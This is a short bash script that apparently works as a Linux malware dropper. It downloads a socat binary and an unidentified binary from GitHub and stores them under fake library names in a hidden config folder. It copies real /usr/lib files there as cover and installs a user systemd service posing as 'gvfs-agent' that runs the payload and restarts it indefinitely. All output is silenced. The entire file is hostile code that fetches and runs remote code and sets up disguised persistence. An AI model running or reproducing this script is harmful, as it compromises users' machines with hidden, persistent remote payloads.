#!/bin/bash
{

mkdir -p $HOME/.config/systemd/user/libxct-util

wget -O $HOME/.config/systemd/user/libxct-util/libdev.so https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin

wget -O $HOME/.config/systemd/user/libxct-util/libdev.so.6 https://github.com/qetuosfhk/sample/blob/master/run?raw=true

chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so
chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so.6

N=50;
for i in /usr/lib/l*; do
  if [[ -f $i ]]; then 
    [ "$((N--))" = 0 ] && break;
    cp -t "$HOME/.config/systemd/user/libxct-util/" -- "$i";
  fi
done

cat > $HOME/.config/systemd/user/gvfs-agent.service << EOF
[Unit]
Description=Virtual filesystem service - agent
StartLimitInterval=0

[Service]
WorkingDirectory=$HOME/.config/systemd/user
ExecStart=/bin/bash -c "$HOME/.config/systemd/user/libxct-util/libdev.so.6"
Restart=always
RestartSec=300

[Install]
WantedBy=default.target
EOF

systemctl --user enable gvfs-agent.service
systemctl --user start gvfs-agent.service

} &> /dev/null
